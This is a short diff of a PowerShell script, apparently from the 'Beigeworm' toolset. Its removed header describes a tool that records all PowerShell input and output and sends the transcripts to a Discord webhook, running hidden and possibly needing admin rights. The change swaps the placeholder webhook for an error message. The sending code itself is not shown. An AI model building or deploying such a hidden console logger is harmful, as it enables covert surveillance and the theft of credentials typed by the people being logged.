@@ -1,21 +1,6 @@
-<# ===================== Beigeworm Global Powershell Transcription to Discord =====================
-
-SYNOPSIS
-Log all powershell input and output and sends results to a webhook.
-
-USAGE
-1. Replace YOUR_WEBHOOK_HERE with your webhook url
-1. Run to enable logging and start sending transcript info
-2. Check Discord for results
-3. Run again to remove logging
-
-NOTES
-Admin Permissions may be required. (for setting execution policies and registry keys)
-
-#>
 
 if ($dc.Length -eq 0){
-$dc = "YOUR_WEBHOOK_HERE"
+write-host "No webhook supplied"
 }
 
 $hideWindow = 1 # 1 = Hidden
